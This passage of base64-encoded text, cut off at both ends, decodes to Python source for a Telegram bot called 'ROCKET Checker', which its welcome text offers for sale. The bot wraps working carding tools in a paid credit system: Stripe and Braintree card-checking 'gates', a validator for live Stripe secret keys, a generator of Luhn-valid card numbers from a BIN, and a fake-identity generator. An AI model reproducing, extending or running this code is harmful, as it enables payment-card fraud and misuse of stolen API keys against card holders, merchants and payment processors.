8Yj7impnvuI8gU3RheSBpbiBjb250cm9sIG9mIHlvdXIgYm90ITwvYj4iIiIsCiAgICAgICAgICAgICAgICBwYXJzZV9tb2RlPSJIVE1MIiwKICAgICAgICAgICAgICAgIHJlcGx5X21hcmt1cD1hZG1pbl9tYXJrdXAsCiAgICAgICAgICAgICkKICAgICAgICBlbHNlOgogICAgICAgICAgICBib3QuYW5zd2VyX2NhbGxiYWNrX3F1ZXJ5KGNhbGwuaWQsICLwn5qrIFlvdSBhcmUgbm90IGFuIGFkbWluISIsIHNob3dfYWxlcnQ9VHJ1ZSkKCiAgICBlbGlmIGFjdGlvbiA9PSAiYmFjayI6CiAgICAgICAgbWFpbl9tZW51X21hcmt1cCA9IElubGluZUtleWJvYXJkTWFya3VwKCkKICAgICAgICBtYWluX21lbnVfbWFya3VwLnJvd193aWR0aCA9IDIKICAgICAgICBtYWluX21lbnVfbWFya3VwLmFkZCgKICAgICAgICAgICAgSW5saW5lS2V5Ym9hcmRCdXR0b24oIvCfm6AgVG9vbHMiLCBjYWxsYmFja19kYXRhPWYidG9vbHN8e293bmVyX2lkfSIpLAogICAgICAgICAgICBJbmxpbmVLZXlib2FyZEJ1dHRvbigi8J+UkSBHYXRlIiwgY2FsbGJhY2tfZGF0YT1mImdhdGV8e293bmVyX2lkfSIpLAogICAgICAgICAgICBJbmxpbmVLZXlib2FyZEJ1dHRvbigi8J+MnyBBZG1pbiIsIGNhbGxiYWNrX2RhdGE9ZiJhZG1pbnx7b3duZXJfaWR9IiksCiAgICAgICAgICAgIElubGluZUtleWJvYXJkQnV0dG9uKCLinYwgQ2xvc2UiLCBjYWxsYmFja19kYXRhPWYiY2xvc2V8e3VzZXJfaWR9IiksCiAgICAgICAgKQogICAgICAgIAogICAgICAgIGJvdC5lZGl0X21lc3NhZ2VfdGV4dCgKICAgICAgICAgICAgY2hhdF9pZD1jYWxsLm1lc3NhZ2UuY2hhdC5pZCwKICAgICAgICAgICAgbWVzc2FnZV9pZD1jYWxsLm1lc3NhZ2UubWVzc2FnZV9pZCwKICAgICAgICAgICAgdGV4dD0iIiLwn4yfIFdlbGNvbWUgYmFjayB0byA8Yj5ST0NLRVQgQ2hlY2tlcjwvYj4g8J+agCAgCgrwn5S5IFVzZSB0aGUgYnV0dG9ucyBiZWxvdyB0byBuYXZpZ2F0ZSB0aHJvdWdoIHRoZSBib3QuICAK8J+UuSBBY2Nlc3MgdmFyaW91cyB0b29scywgcGF5bWVudCBjaGVja2VycywgYW5kIGFkbWluIGNvbnRyb2xzLiAgCgrwn5OMIFdhbnQgdG8gYnV5IHRoaXMgYm90PyBETSB3aXRoIHlvdXIgcHJpY2UgQENIQVRXSVRIUk9DS0VUX0JPVCAgCvCflJAgQWRtaW5zIGNhbiBhY2Nlc3MgYWRkaXRpb25hbCBmZWF0dXJlcyBmcm9tIHRoZSBBZG1pbiBwYW5lbC4iIiIsCiAgICAgICAgICAgIHBhcnNlX21vZGU9IkhUTUwiLAogICAgICAgICAgICByZXBseV9tYXJrdXA9bWFpbl9tZW51X21hcmt1cCwKICAgICAgICApCgoKQGJvdC5tZXNzYWdlX2hhbmRsZXIoZnVuYz1sYW1iZGEgbWVzc2FnZTogbWVzc2FnZS5yZXBseV90b19tZXNzYWdlIGFuZCBtZXNzYWdlLnRleHQubG93ZXIoKSA9PSAiaW5mbyIpCmRlZiBnZXRfcmVwbGllZF91c2VyX2luZm8obWVzc2FnZSk6CiAgICByZXBsaWVkX3VzZXIgPSBtZXNzYWdlLnJlcGx5X3RvX21lc3NhZ2UuZnJvbV91c2VyICAjIEdldCB0aGUgb3JpZ2luYWwgc2VuZGVyJ3MgaW5mbwoKICAgIHVzZXJfaWQgPSByZXBsaWVkX3VzZXIuaWQKICAgIHVzZXJuYW1lID0gcmVwbGllZF91c2VyLnVzZXJuYW1lIG9yICJObyB1c2VybmFtZSIKICAgIGZpcnN0X25hbWUgPSByZXBsaWVkX3VzZXIuZmlyc3RfbmFtZQoKICAgICMgRm9ybWF0IHRoZSByZXNwb25zZQogICAgcmVzcG9uc2UgPSAoCiAgICAgICAgZiLwn5GkICoqVXNlciBJbmZvOioqXG4iCiAgICAgICAgZiLwn4aUICoqSUQ6KiogYHt1c2VyX2lkfWBcbiIKICAgICAgICBmIvCfk5sgKipOYW1lOioqIHtmaXJzdF9uYW1lfVxuIgogICAgICAgIGYi8J+UlyAqKlVzZXJuYW1lOioqIEB7dXNlcm5hbWV9IiBpZiB1c2VybmFtZSAhPSAiTm8gdXNlcm5hbWUiIGVsc2UgIk5vIHVzZXJuYW1lIgogICAgKQoKICAgIGJvdC5yZXBseV90byhtZXNzYWdlLCByZXNwb25zZSwgcGFyc2VfbW9kZT0iTWFya2Rvd24iKQoKCkBib3QubWVzc2FnZV9oYW5kbGVyKGNvbW1hbmRzPVsnY291bnRyeWNvZGUnXSkKZGVmIGtzamRraihtZXNzYWdlKToKICAgIHNlbmRfY291bnRyeV9jb2RlcyhtZXNzYWdlLGJvdCkKCgpAYm90Lm1lc3NhZ2VfaGFuZGxlcihjb21tYW5kcz1bJ2Zha2UnXSkKZGVmIHNqanNqcyhtZXNzYWdlKToKICAgIHNlbmRfZmFrZV9kZXRhaWxzKG1lc3NhZ2UsYm90KQogICAKCkBib3QubWVzc2FnZV9oYW5kbGVyKGNvbW1hbmRzPVsnZGInXSkKZGVmIGJvdF9zdGF0aXN0aWNzKG1lc3NhZ2UpOgogICAgaWYgc3RyKG1lc3NhZ2UuZnJvbV91c2VyLmlkKSBub3QgaW4gYWRtaW46CiAgICAgICAgYm90LnJlcGx5X3RvKG1lc3NhZ2UsICLwn5qrIFlvdSBhcmUgbm90IGF1dGhvcml6ZWQgdG8gdXNlIHRoaXMgY29tbWFuZC4iKQogICAgICAgIHJldHVybgogICAgZnJlZV91c2VycyA9IGxvYWRfZnJlZV91c2VycygpCiAgICBjb2RlcyA9IGxvYWRfY29kZXMoKQogICAgCiAgICB0b3RhbF9jb2RlcyA9IGxlbihjb2RlcykKICAgIHJlZGVlbWVkX2NvZGVzID0gc3VtKDEgZm9yIGMgaW4gY29kZXMudmFsdWVzKCkgaWYgY1sidXNlZCJdKQogICAgdW5yZWRlZW1lZF9jb2RlcyA9IHRvdGFsX2NvZGVzIC0gcmVkZWVtZWRfY29kZXMKICAgIHRvdGFsX3VzZXJzID0gbGVuKGZyZWVfdXNlcnMpCiAgICB0b3RhbF9jcmVkaXRzID0gc3VtKHVzZXIuZ2V0KCJjcmVkaXRzIiwgMCkgZm9yIHVzZXIgaW4gZnJlZV91c2Vycy52YWx1ZXMoKSkKICAgIHJlZGVlbWVkX2NvZGVzID0gc3VtKDEgZm9yIGMgaW4gY29kZXMudmFsdWVzKCkgaWYgYy5nZXQoInVzZWQiLCBGYWxzZSkpCgogICAgcmVzcD0gZiIiIgrwn5OKIEJvdCBTdGF0aXN0aWNzCgrwn5S5IFRvdGFsIENvZGVzIENyZWF0ZWQ6IHt0b3RhbF9jb2Rlc30K4pyFIFJlZGVlbWVkIENvZGVzOiB7cmVkZWVtZWRfY29kZXN9CuKdjCBVbnJlZGVlbWVkIENvZGVzOiB7dW5yZWRlZW1lZF9jb2Rlc30KCvCfkaUgVG90YWwgVXNlcnM6IHt0b3RhbF91c2Vyc30K8J+SsCBUb3RhbCBDcmVkaXRzIGluIFN5c3RlbToge3RvdGFsX2NyZWRpdHN9CgrimpnvuI8gU3RheSB1cGRhdGVkIHdpdGggYm90IHBlcmZvcm1hbmNlIQoiIiIKICAgIGJvdC5yZXBseV90byhtZXNzYWdlLCByZXNwLCBwYXJzZV9tb2RlPSJNYXJrZG93biIpCgojIOKchSBSZWRlZW0gYSBjb2RlCgoKCgoKCkBib3QubWVzc2FnZV9oYW5kbGVyKGNvbW1hbmRzPVsnYnJvYWRjYXN0J10pCmRlZiBicm9hZGNhc3QobWVzc2FnZSk6CiAgICBpZiBzdHIobWVzc2FnZS5mcm9tX3VzZXIuaWQpIG5vdCBpbiBhZG1pbjoKICAgICAgICBib3QucmVwbHlfdG8obWVzc2FnZSwgIvCfmqsgWW91IGFyZSBub3QgYXV0aG9yaXplZCB0byB1c2UgdGhpcyBjb21tYW5kLiIpCiAgICAgICAgcmV0dXJuCgogICAgdGV4dCA9IG1lc3NhZ2UudGV4dC5yZXBsYWNlKCIvYnJvYWRjYXN0IiwgIiIpLnN0cmlwKCkKICAgIGlmIG5vdCB0ZXh0OgogICAgICAgIGJvdC5yZXBseV90byhtZXNzYWdlLCAi4pqg77iPIFBsZWFzZSBwcm92aWRlIGEgbWVzc2FnZSB0byBicm9hZGNhc3QuIikKICAgICAgICByZXR1cm4KCiAgICB1c2VycyA9IGxvYWRfZnJlZV91c2VycygpCiAgICBzZW50LCBmYWlsZWQgPSAwLCAwCgogICAgZm9yIHVzZXJfaWQgaW4gdXNlcnMua2V5cygpOgogICAgICAgIHRyeToKICAgICAgICAgICAgYm90LnNlbmRfbWVzc2FnZSh1c2VyX2lkLCBmIvCfk6IgKip7dGV4dH0iLCBwYXJzZV9tb2RlPSJNYXJrZG93biIpCiAgICAgICAgICAgIHNlbnQgKz0gMQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIGZhaWxlZCArPSAxICAjIFVzZXIgbWlnaHQgaGF2ZSBibG9ja2VkIHRoZSBib3QKCiAgICBib3QucmVwbHlfdG8obWVzc2FnZSwgZiLinIUgKipCcm9hZGNhc3QgU2VudCEqKlxuXG7wn5OpIFNlbnQ6IGB7c2VudH1gIHVzZXJzXG7inYwgRmFpbGVkOiBge2ZhaWxlZH1gIHVzZXJzIiwgcGFyc2VfbW9kZT0iTWFya2Rvd24iKQoKCgoKQGJvdC5tZXNzYWdlX2hhbmRsZXIoY29tbWFuZHM9WydzayddKQpkZWYgb3dqaihtZXNzYWdlKToKICAgIGNoYXRfaWQgPSBtZXNzYWdlLmZyb21fdXNlci5pZAogICAgdHJ5OgogICAgICAgIGFyZ3MgPSBtZXNzYWdlLnRleHQuc3BsaXQoIiAiLCAxKQogICAgICAgIGlmIGxlbihhcmdzKSA8IDIgb3Igbm90IGFyZ3NbMV0uc3RhcnRzd2l0aCgic2tfbGl2ZV8iKToKICAgICAgICAgICAgYm90LnJlcGx5X3RvKG1lc3NhZ2UsICLinYwgKipVc2FnZToqKiBgL3N0YXJ0IHNrX2xpdmVfeHh4YFxuUGxlYXNlIHByb3ZpZGUgYSB2YWxpZCBTdHJpcGUgU2VjcmV0IEtleS4iLCBwYXJzZV9tb2RlPSJNYXJrZG93biIpCiAgICAgICAgICAgIHJldHVybgoKICAgICAgICBza19rZXkgPSBhcmdzWzFdLnN0cmlwKCkKICAgICAgICBpZiBvcChtZXNzYWdlLmZyb21fdXNlci5pZCkgPT1GYWxzZToKICAgICAgICAgICAgYm90LnJlcGx5X3RvKG1lc3NhZ2UsIllvdSBkb250IGhhdmUgZW5vdWdoIGNyZWRpdCIpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgCiAgICAgICAgICAgIGEgPSBzayhza19rZXkpCiAgICAgICAgICAgIGJvdC5yZXBseV90byhtZXNzYWdlLGEscGFyc2VfbW9kZT0gIkhUTUwiKQogICAgZXhjZXB0OgogICAgICAgIHBhc3MKICAgIAoKQGJvdC5tZXNzYWdlX2hhbmRsZXIoY29tbWFuZHM9WydnYXRlJywnZ2F0ZXMnXSkKZGVmIGdhdGVzKG1lc3NhZ2UpOgogICAgaWYgbm90IGlzX3JlZ2lzdGVyZWQobWVzc2FnZS5mcm9tX3VzZXIuaWQpOgogICAgICAgIGJvdC5yZXBseV90byhtZXNzYWdlLCAiSGV5LCB5b3UgYXJlIG5vdCByZWdpc3RlcmVkLiBQbGVhc2UgcmVnaXN0ZXIgdXNpbmcgL3JlZ2lzdGVyIGNtZC7inIUiKQogICAgICAgIHJldHVybgogICAgaWYgc3RyKG1lc3NhZ2UuZnJvbV91c2VyLmlkKSBpbiBzdHIoZnJlZV91c2Vycyk6CiAgICAgICAgYm90LnJlcGx5X3RvKG1lc3NhZ2UsZiIiIvCfkrMgUGF5bWVudCBDaGVja2VycyAoR2F0ZXMpCgovZ2F0ZSAtIPCflJEgTGlzdCBhbGwgYXZhaWxhYmxlIGdhdGVzCgovY2hrIDxjY3xtbXx5eXxjdnY+IC0g4pyFIENoZWNrIFN0cmlwZSBjYXJkIHZhbGlkaXR5CgovYiAtIPCflJAgQnJhaW50cmVlIChQcmVtaXVtKSIiIikKICAgICAgICAKCkBib3QubWVzc2FnZV9oYW5kbGVyKGNvbW1hbmRzPVsndG9vbHMnLCd0b29sJ10pCmRlZiBnYXRlcyhtZXNzYWdlKToKICAgIGlmIG5vdCBpc19yZWdpc3RlcmVkKG1lc3NhZ2UuZnJvbV91c2VyLmlkKToKICAgICAgICBib3QucmVwbHlfdG8obWVzc2FnZSwgIkhleSwgeW91IGFyZSBub3QgcmVnaXN0ZXJlZC4gUGxlYXNlIHJlZ2lzdGVyIHVzaW5nIC9yZWdpc3RlciBjbWQu4pyFIikKICAgICAgICByZXR1cm4KICAgIGNoYXRfaWQgPSBtZXNzYWdlLmZyb21fdXNlci5pZAogICAgcmVzcCA9ICIiIvCflKcgVXNlZnVsIFRvb2xzCgovYmluIGJpbl9udW1iZXIgOiAtIPCfj6YgR2V0IEJJTiBpbmZvcm1hdGlvbgoKL2dlbiBiaW4gOi0g8J+UhCBHZW5lcmF0ZSBjcmVkaXQgY2FyZHMgZnJvbSBCSU4KCi9pbmZvIC0g4oS577iPIEdldCB1c2VyIGluZm9ybWF0aW9uIGJ5IHJlcGx5aW5nIHdpdGggImluZm8iCgovZmFrZSAtIPCfg48gR2VuZXJhdGUgZmFrZSB1c2VyIGRldGFpbHMKCi9jb3VudHJ5Y29kZSAtIPCfjI0gR2V0IGNvdW50cnkgY29kZXMKCi9zayBza19saXZlX3h4eCAtIPCflI0gVmFsaWRhdGUgYSBTdHJpcGUgU2VjcmV0IEtleQogICAgIiIiCiAgICBib3QucmVwbHlfdG8obWVzc2FnZSxyZXNwLHBhcnNlX21vZGU9IkhUTUwiKQogICAgCgoKIyBGdW5jdGlvbiB0byBsb2FkIHN0YXRpc3RpY3MgZnJvbSBmaWxlCmRlZiBsb2FkX3N0YXRzKCk6CiAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoU1RBVFNfRklMRSk6CiAgICAgICAgcmV0dXJuIHsidG90YWxfY29kZXMiOiAwLCAicmVkZWVtZWRfY29kZXMiOiAwLCAidXNlcnMiOiBbXSwgImNyZWRpdHMiOiAwfQogICAgCiAgICB3aXRoIG9wZW4oU1RBVFNfRklMRSwgInIiKSBhcyBmOgogICAgICAgIHRyeToKICAgICAgICAgICAgcmV0dXJuIGpzb24ubG9hZChmKQogICAgICAgIGV4Y2VwdCBqc29uLkpTT05EZWNvZGVFcnJvcjoKICAgICAgICAgICAgcmV0dXJuIHsidG90YWxfY29kZXMiOiAwLCAicmVkZWVtZWRfY29kZXMiOiAwLCAidXNlcnMiOiBbXSwgImNyZWRpdHMiOiAwfQoKIyBGdW5jdGlvbiB0byBzYXZlIHN0YXRpc3RpY3MgdG8gZmlsZQpkZWYgc2F2ZV9zdGF0cyhzdGF0cyk6CiAgICB3aXRoIG9wZW4oU1RBVFNfRklMRSwgInciKSBhcyBmOgogICAgICAgIGpzb24uZHVtcChzdGF0cywgZiwgaW5kZW50PTQpCiAgICAKICAgIAoKQGJvdC5tZXNzYWdlX2hhbmRsZXIoY29tbWFuZHM9WydzdGF0cyddKQpkZWYgc2pqc2pzKG1lc3NhZ2UpOgogICAgaWYgbm90IGlzX3JlZ2lzdGVyZWQobWVzc2FnZS5mcm9tX3VzZXIuaWQpOgogICAgICAgIGJvdC5yZXBseV90byhtZXNzYWdlLCAiSGV5LCB5b3UgYXJlIG5vdCByZWdpc3RlcmVkLiBQbGVhc2UgcmVnaXN0ZXIgdXNpbmcgL3JlZ2lzdGVyIGNtZC7inIUiKQogICAgICAgIHJldHVybgogICAgaWYgc3RyKG1lc3NhZ2UuZnJvbV91c2VyLmlkKSBub3QgaW4gYWRtaW46CiAgICAgICAgYm90LnJlcGx5X3RvKG1lc3NhZ2UsICLwn5qrIFlvdSBhcmUgbm90IGF1dGhvcml6ZWQgdG8gdXNlIHRoaXMgY29tbWFuZC4iKQogICAgICAgIHJldHVybgogICAgZGF0YSA9Zm9ybWF0X3NlcnZlcl9tZXNzYWdlKCkKICAgIGJvdC5yZXBseV90byhtZXNzYWdlLGRhdGEscGFyc2VfbW9kZT0iSFRNTCIpCiAgICAKICAgIAoKICAgIAogICAgCkBib3QubWVzc2FnZV9oYW5kbGVyKGNvbW1hbmRzPVsnYWRkJ10pCmRlZiBhZGRfY3JlZGl0KG1lc3NhZ2UpOgogICAgaWYgbm90IGlzX3JlZ2lzdGVyZWQobWVzc2FnZS5mcm9tX3VzZXIuaWQpOgogICAgICAgIGJvdC5yZXBseV90byhtZXNzYWdlLCAiSGV5LCB5b3UgYXJlIG5vdCByZWdpc3RlcmVkLiBQbGVhc2UgcmVnaXN0ZXIgdXNpbmcgL3JlZ2lzdGVyIGNtZC7inIUiKQogICAgICAgIHJldHVybgogICAgYWRtaW5faWQgPSBtZXNzYWdlLmZyb21fdXNlci5pZAogICAgaWYgc3RyKGFkbWluX2lkKSBub3QgaW4gYWRtaW46ICAjIFJlcGxhY2UgQURNSU5fSURTIHdpdGggYSBsaXN0IG9mIGFkbWluIFRlbGVncmFtIElEcwogICAgICAgIGJvdC5yZXBseV90byhtZXNzYWdlLCAi8J+aqyBZb3UgYXJlIG5vdCBhdXRob3JpemVkIHRvIHVzZSB0aGlzIGNvbW1hbmQuIikKICAgICAgICByZXR1cm4KCiAgICB0cnk6CiAgICAgICAgY29tbWFuZF9wYXJ0cyA9IG1lc3NhZ2UudGV4dC5zcGxpdCgpCiAgICAgICAgaWYgbGVuKGNvbW1hbmRfcGFydHMpICE9IDM6CiAgICAgICAgICAgIGJvdC5yZXBseV90byhtZXNzYWdlLCAi4pqg77iPIFVzYWdlOiAvYWRkY3JlZGl0IDx1c2VyX2lkPiA8YW1vdW50PiIpCiAgICAgICAgICAgIHJldHVybgoKICAgICAgICB1c2VyX2lkID0gaW50KGNvbW1hbmRfcGFydHNbMV0pCiAgICAgICAgYW1vdW50ID0gaW50KGNvbW1hbmRfcGFydHNbMl0pCgogICAgICAgICMgTG9hZCB1c2VyIGRhdGEKICAgICAgICB3aXRoIG9wZW4oImZyZWVfdXNlcnMuanNvbiIsICJyIikgYXMgZmlsZToKICAgICAgICAgICAgdXNlcnMgPSBqc29uLmxvYWQoZmlsZSkKCiAgICAgICAgIyBVcGRhdGUgdXNlcidzIGJhbGFuY2UKICAgICAgICBpZiBzdHIodXNlcl9pZCkgaW4gdXNlcnM6CiAgICAgICAgICAgIHVzZXJzW3N0cih1c2VyX2lkKV1bJ3BvaW50cyddICs9IGFtb3VudAogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHVzZXJzW3N0cih1c2VyX2lkKV0gPSB7J3BvaW50cyc6IGFtb3VudH0KCiAgICAgICAgIyBTYXZlIHVwZGF0ZWQgZGF0YQogICAgICAgIHdpdGggb3BlbigiZnJlZV91c2Vycy5qc29uIiwgInciKSBhcyBmaWxlOgogICAgICAgICAgICBqc29uLmR1bXAodXNlcnMsIGZpbGUsIGluZGVudD00KQoKICAgICAgICBib3QucmVwbHlfdG8obWVzc2FnZSwgZiLinIUgU3VjY2Vzc2Z1bGx5IGFkZGVkIHthbW91bnR9IHBvaW50cyB0byB1c2VyIHt1c2VyX2lkfS4iKQogICAgZXhjZXB0IFZhbHVlRXJyb3I6CiAgICAgICAgYm90LnJlcGx5X3RvKG1lc3NhZ2UsICLimqDvuI8gSW52YWxpZCBpbnB1dC4gTWFrZSBzdXJlIHRvIGVudGVyIG51bWJlcnMgb25seS4iKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIGJvdC5yZXBseV90byhtZXNzYWdlLCBmIuKdjCBFcnJvcjoge3N0cihlKX0iKQoKCgoKCkBib3QubWVzc2FnZV9oYW5kbGVyKGNvbW1hbmRzPVsncmVnaXN0ZXInXSkKZGVmIHJlZ2lzdGVyKG1lc3NhZ2UpOgogICAgY2hhdF9pZCA9IHN0cihtZXNzYWdlLmZyb21fdXNlci5pZCkKICAgIGFwaV91cmwgPSAiaHR0cHM6Ly9yb2NrZXRhcGkyLnB5dGhvbmFueXdoZXJlLmNvbS9yZWdpc3RlciIKICAgIAogICAgdHJ5OgogICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucG9zdChhcGlfdXJsLCBqc29uPXsidXNlcl9pZCI6IGNoYXRfaWR9KQogICAgICAgIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMCBvciByZXNwb25zZS5zdGF0dXNfY29kZSA9PSAyMDE6CiAgICAgICAgICAgIGRhdGEgPSByZXNwb25zZS5qc29uKCkKICAgICAgICAgICAgYm90LnJlcGx5X3RvKG1lc3NhZ2UsIGYi4pyFIHtkYXRhWydtZXNzYWdlJ119XG5cbvCfkrAgQ3JlZGl0czoge2RhdGFbJ2NyZWRpdHMnXX0iKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGJvdC5yZXBseV90byhtZXNzYWdlLCAi4pqg77iPIFNvbWV0aGluZyB3ZW50IHdyb25nISBQbGVhc2UgdHJ5IGFnYWluIGxhdGVyLiIpCgogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIGJvdC5yZXBseV90byhtZXNzYWdlLCAi4pqg77iPIFNlcnZlciBlcnJvciEgUGxlYXNlIHRyeSBhZ2FpbiBsYXRlci4iKQogICAgICAgIHByaW50KGYiRXJyb3IgaW4gL3JlZ2lzdGVyOiB7ZX0iKQoKQGJvdC5tZXNzYWdlX2hhbmRsZXIoY29tbWFuZHM9WydjcmVkaXQnLCAnY3JlZGl0cyddKQpkZWYgY3JlZGl0KG1lc3NhZ2UpOgogICAgZnJlZV91c2VycyA9IGxvYWRfZnJlZV91c2VycygpICAjIExvYWQgdXNlciBkYXRhCiAgICB1c2VyX2lkID0gc3RyKG1lc3NhZ2UuZnJvbV91c2VyLmlkKSAgIyBDb252ZXJ0IHRvIHN0cmluZyBmb3IgSlNPTiBrZXlzCgogICAgaWYgdXNlcl9pZCBub3QgaW4gZnJlZV91c2VyczoKICAgICAgICBib3QucmVwbHlfdG8obWVzc2FnZSwgIkhleSwgeW91IGFyZSBub3QgcmVnaXN0ZXJlZC4gUGxlYXNlIHJlZ2lzdGVyIHVzaW5nIC9yZWdpc3RlciDinIUiKQogICAgICAgIHJldHVybgoKICAgIGNyZWRpdHMgPSBmcmVlX3VzZXJzW3VzZXJfaWRdWyJjcmVkaXRzIl0KICAgIGJvdC5yZXBseV90byhtZXNzYWdlLCBmIvCfkrAgWW91IGhhdmUge2NyZWRpdHN9IGNyZWRpdHMg4pyFIikKICAgIAoKQGJvdC5tZXNzYWdlX2hhbmRsZXIoY29tbWFuZHM9WydhZG1pbiddKQpkZWYgYWRtaW5fY29tbWFuZChtZXNzYWdlKToKICAgIGlmIG5vdCBpc19yZWdpc3RlcmVkKG1lc3NhZ2UuZnJvbV91c2VyLmlkKToKICAgICAgICBib3QucmVwbHlfdG8obWVzc2FnZSwgIkhleSwgeW91IGFyZSBub3QgcmVnaXN0ZXJlZC4gUGxlYXNlIHJlZ2lzdGVyIHVzaW5nIC9yZWdpc3RlciBjbWQu4pyFIikKICAgICAgICByZXR1cm4KICAgICAgICByZXR1cm4gCiAgICBpZiBzdHIobWVzc2FnZS5mcm9tX3VzZXIuaWQpIG5vdCBpbiBhZG1pbjoKICAgICAgICBib3QucmVwbHlfdG8obWVzc2FnZSwgIuKdjCBZb3UgYXJlIG5vdCBhbiBhZG1pbiEiKQogICAgICAgIHJldHVybgogICAgYm90LnJlcGx5X3RvKG1lc3NhZ2UsIGYiIiLwn5SRIEFkbWluIENvbW1hbmRzIChBZG1pbnMgT25seSkKCi9hZG1pbiAtIPCfm6DvuI8gQWNjZXNzIGFkbWluIGZlYXR1cmVzCi9icm9hZGNhc3QgPG1lc3NhZ2U+IC0g8J+ToiBTZW5kIGEgbWVzc2FnZSB0byBhbGwgdXNlcnMKL2NvZGUgPHF0eT4gPGNyZWRpdHM+IC0g8J+On++4jyBHZW5lcmF0ZSByZWRlZW1hYmxlIGNvZGVzCi9kYiAtIPCfk4ogVmlldyBib3QgZGF0YWJhc2Ugc3RhdGlzdGljcwrwn5OKIFNlcnZlciAmIE5ldHdvcmsgVG9vbHMKL3N0YXRzIC0g8J+TiCBTZXJ2ZXIgbW9uaXRvcmluZyBzdGF0cwovcGluZyAtIPCfk6EgQ2hlY2sgbmV0d29yayBsYXRlbmN5IiIiKQoKCgphc3luYyBkZWYgZ2V0X2Jpbl9kZXRhaWxzKGJpbl9udW1iZXIpOgogICAgdHJ5OgogICAgICAgIGFzeW5jIHdpdGggaHR0cHguQXN5bmNDbGllbnQoKSBhcyBjbGllbnQ6CiAgICAgICAgICAgIHJlc3AgPSBhd2FpdCBjbGllbnQuZ2V0KGYie0JJTlNfQVBJX1VSTH17YmluX251bWJlcn0iKQogICAgICAgICAgICByZXNwLnJhaXNlX2Zvcl9zdGF0dXMoKQogICAgICAgICAgICBqc29uX2RhdGEgPSByZXNwLmpzb24oKQogICAgICAgICAgICBicmFuZCA9IGpzb25fZGF0YS5nZXQoImJyYW5kIiwgIk4vQSIpCiAgICAgICAgICAgIHR5cGVfID0ganNvbl9kYXRhLmdldCgidHlwZSIsICJOL0EiKQogICAgICAgICAgICBsZXZlbCA9IGpzb25fZGF0YS5nZXQoImxldmVsIiwgIk4vQSIpCiAgICAgICAgICAgIGJhbmsgPSBqc29uX2RhdGEuZ2V0KCJiYW5rIiwgIk4vQSIpCiAgICAgICAgICAgIGNvdW50cnkgPSBqc29uX2RhdGEuZ2V0KCJjb3VudHJ5X25hbWUiLCAiTi9BIikKICAgICAgICAgICAgZmxhZyA9IGpzb25fZGF0YS5nZXQoImNvdW50cnlfZmxhZyIsICJOL0EiKQogICAgICAgICAgICBjdXJyZW5jeSA9IGpzb25fZGF0YS5nZXQoImN1cnJlbmN5IiwgIk4vQSIpCiAgICAgICAgICAgIHJldHVybiBicmFuZCwgdHlwZV8sIGxldmVsLCBiYW5rLCBjb3VudHJ5LCBmbGFnLCBjdXJyZW5jeQogICAgZXhjZXB0IGh0dHB4LkhUVFBFcnJvciBhcyBlOgogICAgICAgIHByaW50KGYiSFRUUCBFeGNlcHRpb246IHtlfSIpCiAgICAgICAgcmV0dXJuICJOL0EiLCAiTi9BIiwgIk4vQSIsICJOL0EiLCAiTi9BIiwgIk4vQSIsICJOL0EiCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoZiJFeGNlcHRpb24gaW4gZ2V0X2Jpbl9kZXRhaWxzOiB7ZX0iKQogICAgICAgIHJldHVybiAiTi9BIiwgIk4vQSIsICJOL0EiLCAiTi9BIiwgIk4vQSIsICJOL0EiLCAiTi9BIgoKYXN5bmMgZGVmIGx1aG5fY2FyZF9nZW5hcmF0b3IoYmluX2lucHV0LCBtb250aD1Ob25lLCB5ZWFyPU5vbmUsIGN2dj1Ob25lLCBhbW91bnQ9MTApOgogICAgZ2VuZXJhdGVkX2NhcmRzID0gc2V0KCkKICAgIGJpbl90ZW1wbGF0ZSA9IGJpbl9pbnB1dC5yZXBsYWNlKCd4JywgJyMnKQoKICAgIGlmICcjJyBub3QgaW4gYmluX3RlbXBsYXRlOgogICAgICAgIGJpbl90ZW1wbGF0ZSArPSAnIycgKiAoMTYgLSBsZW4oYmluX3RlbXBsYXRlKSkKCiAgICBpZiBiaW5fdGVtcGxhdGUuc3RhcnRzd2l0aCgnNCcpOgogICAgICAgIGNhcmRfdHlwZSA9ICdWSVNBJwogICAgZWxpZiBiaW5fdGVtcGxhdGUuc3RhcnRzd2l0aCgoJzUxJywgJzUyJywgJzUzJywgJzU0JywgJzU1JykpOgogICAgICAgIGNhcmRfdHlwZSA9ICdNQVNURVJDQVJEJwogICAgZWxpZiBiaW5fdGVtcGxhdGUuc3RhcnRzd2l0aCgoJzM0JywgJzM3JykpOgogICAgICAgIGNhcmRfdHlwZSA9ICdBTUVYJwogICAgZWxpZiBiaW5fdGVtcGxhdGUuc3RhcnRzd2l0aCgnNicpOgogICAgICAgIGNhcmRfdHlwZSA9ICdESVNDT1ZFUicKICAgIGVsc2U6CiAgICAgICAgY2FyZF90eXBlID0gJ1VOS05PV04nCgogICAgd2hpbGUgbGVuKGdlbmVyYXRlZF9jYXJkcykgPCBhbW91bnQ6CiAgICAgICAgY2FyZF9udW1iZXIgPSBsaXN0KGJpbl90ZW1wbGF0ZSkKCiAgICAgICAgZm9yIGkgaW4gcmFuZ2UobGVuKGNhcmRfbnVtYmVyKSk6CiAgICAgICAgICAgIGlmIGNhcmRfbnVtYmVyW2ldID09ICcjJzoKICAgICAgICAgICAgICAgIGNhcmRfbnVtYmVyW2ldID0gc3RyKHJhbmRvbS5yYW5kaW50KDAsIDkpKQoKICAgICAgICBjYXJkX251bWJlciA9ICcnLmpvaW4oY2FyZF9udW1iZXIpCgogICAgICAgIGx1aG5fc3VtID0gMAogICAgICAgIHJldmVyc2VfZGlnaXRzID0gbGlzdChtYXAoaW50LCBjYXJkX251bWJlcls6LTFdKSlbOjotMV0KCiAgICAgICAgZm9yIGksIGRpZ2l0IGluIGVudW1lcmF0ZShyZXZlcnNlX2RpZ2l0cyk6CiAgICAgICAgICAgIGlmIGkgJSAyID09IDA6CiAgICAgICAgICAgICAgICBkaWdpdCAqPSAyCiAgICAgICAgICAgICAgICBpZiBkaWdpdCA+IDk6CiA